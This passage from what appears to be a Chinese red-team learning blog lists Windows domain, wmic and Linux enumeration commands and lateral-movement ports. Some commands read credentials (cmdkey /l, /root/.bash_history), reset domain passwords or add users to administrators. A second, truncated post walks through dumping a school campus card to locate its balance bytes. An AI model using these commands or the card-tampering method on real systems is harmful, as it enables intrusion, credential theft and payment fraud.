\Device\HarddiskVolume1系统区域设置:     zh<span class="hljs-literal">-cn</span>;中文(中国)输入法区域设置:   zh<span class="hljs-literal">-cn</span>;中文(中国)时区:             (UTC+<span class="hljs-number">08</span>:<span class="hljs-number">00</span>)北京，重庆，香港特别行政区，乌鲁木齐物理内存总量:     <span class="hljs-number">2</span>,<span class="hljs-number">047</span> MB可用的物理内存:   <span class="hljs-number">1</span>,<span class="hljs-number">529</span> MB虚拟内存: 最大值: <span class="hljs-number">4</span>,<span class="hljs-number">095</span> MB虚拟内存: 可用:   <span class="hljs-number">3</span>,<span class="hljs-number">562</span> MB虚拟内存: 使用中: <span class="hljs-number">533</span> MB页面文件位置:     C:\pagefile.sys域:               secice.cn登录服务器:       \\WIN<span class="hljs-literal">-2008</span>修补程序:         安装了 <span class="hljs-number">2</span> 个修补程序。                  [<span class="hljs-number">01</span>]: KB2999226                  [<span class="hljs-number">02</span>]: KB976902网卡:             安装了 <span class="hljs-number">2</span> 个 NIC。                  [<span class="hljs-number">01</span>]: Intel(<span class="hljs-built_in">R</span>) PRO/<span class="hljs-number">1000</span> MT Network Connection                      连接名:      本地连接                      启用 DHCP:   否                      IP 地址                        [<span class="hljs-number">01</span>]: <span class="hljs-number">192.168</span>.<span class="hljs-number">3.101</span>                        [<span class="hljs-number">02</span>]: fe80::<span class="hljs-number">15</span>a9:e224:<span class="hljs-number">1</span>f9b:<span class="hljs-number">336</span>                  [<span class="hljs-number">02</span>]: Intel(<span class="hljs-built_in">R</span>) PRO/<span class="hljs-number">1000</span> MT Network Connection                      连接名:      本地连接 <span class="hljs-number">2</span>                      启用 DHCP:   是                      DHCP 服务器: <span class="hljs-number">192.168</span>.<span class="hljs-number">126.254</span>                      IP 地址                        [<span class="hljs-number">01</span>]: <span class="hljs-number">192.168</span>.<span class="hljs-number">126.175</span>                        [<span class="hljs-number">02</span>]: fe80::d1cb:<span class="hljs-number">2</span>aa2:fe1f:d647</code></pre><h4 id="Tcp-udp-网络连接状态信息"><a href="#Tcp-udp-网络连接状态信息" class="headerlink" title="Tcp/udp 网络连接状态信息"></a><strong>Tcp/udp 网络连接状态信息</strong></h4><p>可以获取内网IP分布状态-服务（redis)</p><pre><code class="hljs powershell">netstat <span class="hljs-literal">-ano</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/18.png" alt="Tcp/udp 网络连接状态信息"></p><h4 id="查看机器名"><a href="#查看机器名" class="headerlink" title="查看机器名"></a><strong>查看机器名</strong></h4><pre><code class="hljs powershell">hostname</code></pre><h4 id="查看当前操作系统"><a href="#查看当前操作系统" class="headerlink" title="查看当前操作系统"></a><strong>查看当前操作系统</strong></h4><pre><code class="hljs pgsql">wmic OS <span class="hljs-keyword">get</span> Caption,CSDVersion,OSArchitecture,<span class="hljs-keyword">Version</span> ver</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/19.png" alt="查看当前操作系统"></p><h4 id="查看当前安装的程序"><a href="#查看当前安装的程序" class="headerlink" title="查看当前安装的程序"></a><strong>查看当前安装的程序</strong></h4><pre><code class="hljs applescript">wmic product <span class="hljs-keyword">get</span> <span class="hljs-built_in">name</span>,<span class="hljs-built_in">version</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20.png" alt="查看当前安装的程序"></p><h4 id="查看在线用户"><a href="#查看在线用户" class="headerlink" title="查看在线用户"></a><strong>查看在线用户</strong></h4><pre><code class="hljs ebnf"><span class="hljs-attribute">quser</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/21.png" alt="查看在线用户"></p><h4 id="查看网络配置"><a href="#查看网络配置" class="headerlink" title="查看网络配置"></a><strong>查看网络配置</strong></h4><p>有 Primary Dns Suff就说明是域内，空的则当前机器应该在工作组</p><pre><code class="hljs ada">ipconfig /<span class="hljs-keyword">all</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/22.png" alt="查看网络配置"></p><h4 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a><strong>查看进程</strong></h4><p>有些进程可能是域用户启的-&gt;通过管理员权限凭证窃取-&gt;窃取域用户的凭证</p><pre><code class="hljs jboss-cli">tasklist <span class="hljs-string">/v</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/23.png" alt="查看进程"></p><h4 id="查看当前登陆域"><a href="#查看当前登陆域" class="headerlink" title="查看当前登陆域"></a><strong>查看当前登陆域</strong></h4><pre><code class="hljs arduino">net <span class="hljs-built_in">config</span> workstation</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/24.png" alt="查看当前登陆域"></p><h4 id="远程桌面链接历史记录"><a href="#远程桌面链接历史记录" class="headerlink" title="远程桌面链接历史记录"></a><strong>远程桌面链接历史记录</strong></h4><p>可以把凭证取下来-&gt;本地解密</p><pre><code class="hljs jboss-cli">cmdkey <span class="hljs-string">/l</span></code></pre><h4 id="查看本机上的用户账户列表"><a href="#查看本机上的用户账户列表" class="headerlink" title="查看本机上的用户账户列表"></a><strong>查看本机上的用户账户列表</strong></h4><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title"></span></code></pre><h4 id="查看本机用户xxx的信息"><a href="#查看本机用户xxx的信息" class="headerlink" title="查看本机用户xxx的信息"></a><strong>查看本机用户xxx的信息</strong></h4><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">xxx</span></code></pre><h4 id="查看本机用户xxx的信息-1"><a href="#查看本机用户xxx的信息-1" class="headerlink" title="查看本机用户xxx的信息"></a><strong>查看本机用户xxx的信息</strong></h4><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">/domain</span> 显示所在域的用户名单net <span class="hljs-keyword">user</span> <span class="hljs-title">域用户 /domain</span>获取某个域用户的详细信息 net <span class="hljs-keyword">user</span> <span class="hljs-title">/domain</span> xxx <span class="hljs-number">12345678</span> 修改域用户密码，需要域管理员权限</code></pre><hr><h3 id="Windows（域）"><a href="#Windows（域）" class="headerlink" title="Windows（域）"></a>Windows（域）</h3><pre><code class="hljs powershell">nltest /domain_trusts /all_trusts /v /server:<span class="hljs-number">192.168</span>.<span class="hljs-number">126.175</span>    返回所有信任域列表nltest /dsgetdc:secice /server:<span class="hljs-number">192.168</span>.<span class="hljs-number">3.101</span>       返回域控和其相应的IP地net user /<span class="hljs-keyword">do</span>    获取域用户列表net <span class="hljs-built_in">group</span> /domain查看域里面的组。net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;domain computers&quot;</span> /domain查看域内所有的主机计算机名。net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;domain admins&quot;</span> /domain查看域管理员。net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;domain controllers&quot;</span> /domain查看域控制器。net <span class="hljs-built_in">group</span> <span class="hljs-string">&quot;enterprise admins&quot;</span> /domain查看企业管理组。net localgroup administrators   本机管理员[通常含有域用户]net localgroup administrators /domain    登录本机的域管理员 net localgroup administrators workgroup\user001 /add    域用户添加到本机</code></pre><pre><code class="hljs powershell">net view 查看同一域内机器列表 net view \\ip查看某IP共享net view \\GHQ    查看GHQ计算机的共享资源列表 net view /domain查看内网存在多少个域 net view /domain:XYZ查看XYZ域中的机器列表 net accounts /domain查询域用户密码过期等信息net time/domain查看时间服务器。</code></pre><p>定位域控IP</p><pre><code class="hljs powershell"><span class="hljs-number">1</span>)ipconfig /all通常域内主机 DNS 地址就是域控地址<span class="hljs-number">2</span>)查看开启 <span class="hljs-number">53</span>，<span class="hljs-number">389</span> 等端口的主机<span class="hljs-number">3</span>)net time /domain &amp;&amp; ping DC.secice.cn</code></pre><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="查看当前权限"><a href="#查看当前权限" class="headerlink" title="查看当前权限"></a><strong>查看当前权限</strong></h4><pre><code class="hljs ebnf"><span class="hljs-attribute">whoami</span></code></pre><h4 id="查看网卡配置"><a href="#查看网卡配置" class="headerlink" title="查看网卡配置"></a><strong>查看网卡配置</strong></h4><pre><code class="hljs ebnf"><span class="hljs-attribute">ifconfig</span></code></pre><h4 id="查看端口状态（开启了哪些服务，内网IP连接等"><a href="#查看端口状态（开启了哪些服务，内网IP连接等" class="headerlink" title="查看端口状态（开启了哪些服务，内网IP连接等"></a><strong>查看端口状态（开启了哪些服务，内网IP连接等</strong></h4><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -anpt</span></code></pre><h4 id="查看进程状态（开启了哪些服务等）"><a href="#查看进程状态（开启了哪些服务等）" class="headerlink" title="查看进程状态（开启了哪些服务等）"></a><strong>查看进程状态（开启了哪些服务等）</strong></h4><pre><code class="hljs ebnf"><span class="hljs-attribute">ps -ef</span></code></pre><h4 id="查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）"><a href="#查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）" class="headerlink" title="查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）"></a><strong>查看管理员的历史输入命令（获取密码，网站目录，内网资产等信息）</strong></h4><pre><code class="hljs awk">cat <span class="hljs-regexp">/root/</span>.bash_history</code></pre><h4 id="查找某个文件（寻找配置文件等）"><a href="#查找某个文件（寻找配置文件等）" class="headerlink" title="查找某个文件（寻找配置文件等）"></a><strong>查找某个文件（寻找配置文件等）</strong></h4><pre><code class="hljs nginx"><span class="hljs-attribute">find</span> / -name <span class="hljs-regexp">*.cfg</span></code></pre><hr><h2 id="10、后渗透信息收集之wmic命令的一些使用方法"><a href="#10、后渗透信息收集之wmic命令的一些使用方法" class="headerlink" title="10、后渗透信息收集之wmic命令的一些使用方法"></a>10、后渗透信息收集之wmic命令的一些使用方法</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>wmic和cmd一样在所有的windows版本中都存在，同时wmic有很多cmd下不方便使用的部分，今天给大家介绍一些在后渗透过程中非常适用的使用wmic进行信息收集的命令</p><h3 id="关于wmic"><a href="#关于wmic" class="headerlink" title="关于wmic"></a><strong>关于wmic</strong></h3><p>WMI命令行（WMIC）实用程序为WMI提供了命令行界面。WMIC与现有的Shell和实用程序命令兼容。在WMIC出现之前，如果要管理WMI系统，必须使用一些专门的WMI应用，例如SMS，或者使用WMI的脚本编程API，或者使用象CIM Studio之类的工具。如果不熟悉C++之类的编程语言或VBScript之类的脚本语言，或者不掌握WMI名称空间的基本知识，要用WMI管理系统是很困难的，WMIC改变了这种情况</p><h3 id="wmic的简单使用"><a href="#wmic的简单使用" class="headerlink" title="wmic的简单使用"></a>wmic的简单使用</h3><p>首先在cmd命令行输入<code>wmic</code>进入交互式页面，这里说一下在powershell也可以和cmd命令行一样的操作<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/25.png" alt="wmic的简单使用"></p><pre><code class="hljs arduino">/?查看WMIC命令的全局选项以及命令属性等<span class="hljs-built_in">process</span> /?进程管理的帮助wmic <span class="hljs-built_in">process</span> <span class="hljs-built_in">get</span> /?   属性获取操作帮助</code></pre><p>根据实际的需要去对相关的信息进行读取</p><h3 id="以进程为例展现wmic的使用"><a href="#以进程为例展现wmic的使用" class="headerlink" title="以进程为例展现wmic的使用"></a>以进程为例展现wmic的使用</h3><p>这里的靶机是<code>server 2008</code>的虚拟机，这里以查看进程为例：</p><h4 id="获取系统当前正在运行的进程等信息"><a href="#获取系统当前正在运行的进程等信息" class="headerlink" title="获取系统当前正在运行的进程等信息"></a>获取系统当前正在运行的进程等信息</h4><pre><code class="hljs arduino">wmic <span class="hljs-built_in">process</span> <span class="hljs-built_in">get</span> caption,executablepath,processid</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/26.png" alt="获取进程信息"></p><h4 id="查看服务进程详细信息"><a href="#查看服务进程详细信息" class="headerlink" title="查看服务进程详细信息"></a>查看服务进程详细信息</h4><pre><code class="hljs pf">wmic service where (<span class="hljs-keyword">state</span>=<span class="hljs-string">&quot;running&quot;</span>) get name ,processid ,pathname ,startmode ,caption</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/27.png" alt="获取进程详细信息"></p><h4 id="系统安装软件情况"><a href="#系统安装软件情况" class="headerlink" title="系统安装软件情况"></a>系统安装软件情况</h4><pre><code class="hljs applescript">wmic product <span class="hljs-keyword">get</span> <span class="hljs-built_in">name</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20.png" alt="查看当前安装的程序"></p><h4 id="系统环境变量"><a href="#系统环境变量" class="headerlink" title="系统环境变量"></a>系统环境变量</h4><pre><code class="hljs routeros">wmic environment <span class="hljs-builtin-name">get</span> Description, VariableValue</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201215_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/28.png" alt="查看当前安装的程序"></p><p>关于更多的信息可以通过官方的说明文档</p><p><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wmic">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wmic</a></p><h3 id="关于powershell的Get-Wmi对象"><a href="#关于powershell的Get-Wmi对象" class="headerlink" title="关于powershell的Get-Wmi对象"></a>关于powershell的Get-Wmi对象</h3><p><code>Get-Wmi</code>是获取<code>Windows Management Instrumentation（WMI）</code>类的实例或有关可用类的信息。我们需要首先知道自己的 windows计算机支持那些可用的WMI类</p><pre><code class="hljs lsl">Get-Wmiobject -<span class="hljs-type">list</span> 自己的windows计算机支持那些可用的WMI类</code></pre><pre><code class="hljs dsconfig"><span class="hljs-built_in">get-wmiobject</span><span class="hljs-built_in">get-wmiobject</span> -<span class="hljs-string">class </span><span class="hljs-string">win32_process</span>在本地计算机上获取进程</code></pre><p>具体的参数以及命令在官方文档中进行查询：</p><p><a href="https://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Management/Get-WmiObject?view=powershell-5.l#parameters">https://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Management/Get-WmiObject?view=powershell-5.l#parameters</a></p><h2 id="11、内网横向常见端口"><a href="#11、内网横向常见端口" class="headerlink" title="11、内网横向常见端口"></a>11、内网横向常见端口</h2><h3 id="Port-445"><a href="#Port-445" class="headerlink" title="Port. 445"></a>Port. 445</h3><p>SMB( Server Message Block) Windows协议族，主要功能为文件打印共享服务，简单来讲就是共享文件夹</p><p>该端口也是近年来内网横向扩展中比较火的端口，大名鼎鼎的永恒之蓝漏洞就是利用该端口，操作为扫描其是否存在MS17-010漏洞。正常情况下，其命令主要是建立IPC服务中</p><h4 id="空会话"><a href="#空会话" class="headerlink" title="空会话"></a><strong>空会话</strong></h4><pre><code class="hljs apache"><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.x</code></pre><h4 id="远程本地认证"><a href="#远程本地认证" class="headerlink" title="远程本地认证"></a><strong>远程本地认证</strong></h4><pre><code class="hljs sql">net <span class="hljs-keyword">use</span> \\<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span> /<span class="hljs-keyword">user</span>:a\username <span class="hljs-keyword">password</span></code></pre><p>注：a/username 中 a 为工作组情况下的机器命名，可以为任意字符，例如workgroup/username</p><h4 id="域-test-local-远程认证"><a href="#域-test-local-远程认证" class="headerlink" title="域 test.local 远程认证"></a><strong>域 test.local 远程认证</strong></h4><pre><code class="hljs sql">net <span class="hljs-keyword">use</span> \\<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span> /<span class="hljs-keyword">user</span>:<span class="hljs-keyword">test</span>\username <span class="hljs-keyword">password</span></code></pre><h3 id="Port-137、138、139"><a href="#Port-137、138、139" class="headerlink" title="Port:137、138、139"></a>Port:137、138、139</h3><p>NetBios端口，137、138为UDP端口，主要用于内网传输文件，而NetBios/SMB服务的获取主要是通过139端口</p><h3 id="Port-135"><a href="#Port-135" class="headerlink" title="Port: 135"></a><strong>Port: 135</strong></h3><p>该端口主要使用<code>DCOM</code>和<code>RPC（Remote Procedure Call）</code>服务，我们利用这个端口主要做<code>WMI（Windows Management Instrumentation）</code>管理工具的远程操作</p><ul><li>使用时需要开启wmic服务</li><li>几乎所有的命令都是管理员权限</li><li>如果出现 “Invalid Globa| Switch”，需要使用双引号把该加的地方都加上 </li><li>远程系统的本地安全策略的“网络访问：本地帐户的共享和安全模式”应设为“经典-本地用户以自己的身份验证”</li><li>防火墙最好是关闭状态</li></ul><h3 id="Port-53"><a href="#Port-53" class="headerlink" title="Port: 53"></a><strong>Port: 53</strong></h3><p>该端口为DNS服务端口，只要提供域名解析服务使用，该端口在渗透过程中可以寻找一下DNS域传送漏洞，在内网中可以使用DNS协议进行通信传输，隐蔽性更加好<br><strong>参考文章</strong> ：</p><h4 id="dns隧道之dns2tcp"><a href="#dns隧道之dns2tcp" class="headerlink" title="dns隧道之dns2tcp"></a>dns隧道之dns2tcp</h4><ul><li><a href="https://blog.csdn.net/gsls200808/article/details/50318947">https://blog.csdn.net/gsls200808/article/details/50318947</a></li><li><a href="https://blog.csdn.net/deng_xj/article/details/88834124">https://blog.csdn.net/deng_xj/article/details/88834124</a></li></ul><h4 id="dns隧道之unseat2"><a href="#dns隧道之unseat2" class="headerlink" title="dns隧道之unseat2"></a>dns隧道之unseat2</h4><ul><li><a href="https://www.cnblogs.com/bonelee/p/7927706.html">https://www.cnblogs.com/bonelee/p/7927706.html</a></li><li><a href="https://blog.csdn.net/ddr12231/article/details/102306989">https://blog.csdn.net/ddr12231/article/details/102306989</a></li></ul><h3 id="Port-389"><a href="#Port-389" class="headerlink" title="Port: 389"></a><strong>Port: 389</strong></h3><p>用于LADP（轻量级目录访问协议），属于TCP/IP协议，在域过程中一般出现在域控上出现该端口，进行权限认证服务，如果拥有对该域的用户，且担心net或者其他爆破方法不可行的情况，可以尝试使用LADP端口进行爆破</p><p>工具可以使用类似于hydra等开源项目</p><h3 id="Port-88"><a href="#Port-88" class="headerlink" title="Port: 88"></a><strong>Port: 88</strong></h3><p>该端口主要开启Kerberos服务，属于TCP/IP协议，主要任务是监听KDC的票据请求，该协议在渗透过程中可以进行黄金票据和白银票据的伪造，以横向扩展某些服务</p><h3 id="Port-5985"><a href="#Port-5985" class="headerlink" title="Port: 5985"></a><strong>Port: 5985</strong></h3><p>该端口主要介绍WinRM服务，WinRM是Windows对WS-Management的实现，WinRM允许远程用户使用工具和脚本对Windows服务器进行管理并获取数据。并且WinRM服务自Windows Vista开始成为Windows的默认组件</p><p>条件:</p><ul><li>Windows Vista上必须手动启动，而Windows Server 2008 中服务是默认开启的 </li><li>服务在后台开启，但是端口还没有开启监听，所以需要开启端口 </li><li>使用 winrm quickconfig 对winRM进行配置，开启HTTP和HTTPSS监听，且需要开启防火墙</li></ul>]]></content>
    
    
    <categories>
      
      <category>红队攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>红队攻防</tag>
      
      <tag>渗透攻击红队百科全书</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我是如何破解学校一慧通的</title>
    <link href="/p/c92f138d.html"/>
    <url>/p/c92f138d.html</url>
    
    <content type="html"><![CDATA[<p>文章是大学的时候写的，现在毕业多年，打算将过程写出来分享下学习思路</p><div class="note note-primary">            <p>本文章只做技术交流，请勿将文章中涉及技术用于非法或其他用途，由此产生纠纷问题均与本人无关！</p>          </div><h2 id="一、破解打水功能"><a href="#一、破解打水功能" class="headerlink" title="一、破解打水功能"></a>一、破解打水功能</h2><p>用到的工具：</p><blockquote><p>读卡设备：ACCR122U一个</p></blockquote><blockquote><p>空白M1卡片一张</p></blockquote><blockquote><p>在用的一慧通一张 </p></blockquote><p>上图：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/01.png" alt="我是如何破解学校一慧通的"></p><blockquote><p>平台：windows7</p></blockquote><blockquote><p>软件：NFCGUI-Pro.exe</p></blockquote><blockquote><p>M1卡服务程序</p></blockquote><h3 id="具体实施："><a href="#具体实施：" class="headerlink" title="具体实施："></a>具体实施：</h3><p>先去打水那查看卡内的余额：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/02.png" alt="我是如何破解学校一慧通的"></p><p>卡内余额为29.85元，然后将ACR122u插在机器上，使用M1卡服务程序破解得出卡内的DUMP文件</p><p>使用M1卡服务器程序破解：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/03.png" alt="我是如何破解学校一慧通的"></p><p>破解成功</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/04.png" alt="我是如何破解学校一慧通的"></p><p>破解了好久终于破解成功，dump文件会生成在文件目录下：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/05.png" alt="我是如何破解学校一慧通的"></p><p><code>dumpfile 09d222aa (2015-11-1210_37_36) 1K.dump</code>文件就是生成的破解文件  可以看到生成的dump文件为1KB大小，但是具体写入M1卡的时候是需要写入4KB大小的dump文件的</p><p>我是可以使用NFCGUI-PRO.exe修复，</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/06.png" alt="我是如何破解学校一慧通的"></p><p>打开这个软件点击选择文件-选择刚才生成的1KB文件-就会提示“是否保存为4K文件格式”—选择“是”-就是自带修复成功</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/07.png" alt="我是如何破解学校一慧通的"></p><p>然后关闭软件，刚才的1kb的DUMP文件就会自带修复为4KB文件了。</p><p>通过上面的方法再得到两个不同金额的dump文件。</p><p>通过十六进制编辑器进行dump文件的对比，找出金额控制位，我使用winhex进行编辑dump文件：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/08.png" alt="我是如何破解学校一慧通的"></p><p>因为这三个文件都是同一张卡片不同金额的dump文件，所以假定有金额的数据不同，有刷</p><p>卡次数记录的数据不同，刷卡时间的记录不同，（假定会有这些不同之处，也许只有记录</p><p>金额的变化），通过对比两张卡片，发现在00000901有不同的数据块 </p><p><strong>如图</strong></p><p>余额为29.85：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/09.png" alt="我是如何破解学校一慧通的"></p><p>余额为29.83：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/10.png" alt="我是如何破解学校一慧通的"></p><p>余额为29.33：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/11.png" alt="我是如何破解学校一慧通的"></p><p>发现这两张卡内的不同之处在于：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20201214_%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E7%A0%B4%E8%A7%A3%E5%AD%A6%E6%A0%A1%E4%B8%80%E6%85%A7%E9%80%9A%E7%9A%84/12.png" alt="我是如何破解学校一慧通的"></p><p><img 